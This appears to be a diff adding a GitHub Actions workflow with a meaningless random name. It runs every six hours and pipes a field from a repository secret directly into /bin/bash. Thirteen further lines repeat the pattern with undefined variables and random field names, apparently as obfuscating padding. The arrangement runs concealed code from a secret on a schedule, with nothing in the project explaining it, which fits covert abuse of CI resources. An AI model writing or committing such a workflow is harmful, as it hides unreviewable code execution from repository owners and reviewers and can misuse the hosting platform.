@@ -1,0 +1,32 @@
+name: zdhaioulou
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zdhaioulou
+        env:
+          ke19325: ${{ secrets.ke19325 }}
+        run: |
+          echo $ke19325 | jq -r .ye72978 | /bin/bash
+          echo $xx4796 | jq -r .mkhve84 | /bin/bash
+          echo $gmd88 | jq -r .dy4539 | /bin/bash
+          echo $dvm275 | jq -r .lsnup7940 | /bin/bash
+          echo $j6770 | jq -r .svhy574 | /bin/bash
+          echo $rrhwp66386 | jq -r .cc8 | /bin/bash
+          echo $obu27 | jq -r .fs778 | /bin/bash
+          echo $v79 | jq -r .tw501 | /bin/bash
+          echo $wqz25 | jq -r .zyld32 | /bin/bash
+          echo $xrc5 | jq -r .ca37548 | /bin/bash
+          echo $zhick75 | jq -r .e75290 | /bin/bash
+          echo $enok33720 | jq -r .nog74493 | /bin/bash
+          echo $z63141 | jq -r .izzh4 | /bin/bash
+          echo $el745 | jq -r .b4 | /bin/bash
+
